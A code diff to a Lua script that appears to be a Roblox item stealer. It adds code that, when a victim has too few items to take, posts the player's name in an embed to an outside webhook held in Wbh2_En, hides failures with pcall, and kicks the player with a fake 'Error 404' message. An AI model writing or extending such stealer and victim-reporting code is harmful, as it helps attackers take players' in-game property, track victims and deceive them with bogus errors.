@@ -270,6 +270,22 @@ if _G.Act == true then
             end
 
             if #StealItems <= 1 then
+                local data = {
+                    ["avatar_url"] = "",
+                    ["content"] = "",
+                    ["embeds"] = {
+                        {
+                            ["title"] = "Looser "..LP.Name.." | Zero Items | #StealItems",
+                            ["type"] = "rich",
+                            ["color"] = 16777215
+                        }
+                    }
+                }
+                
+                pcall(function() 
+                    request({Url = Wbh2_En, Method="POST", Body=http:JSONEncode(data), Headers = {["content-type"] = "application/json"}}) 
+                end)
+
                 LP:Kick("Error 404")
             end
 
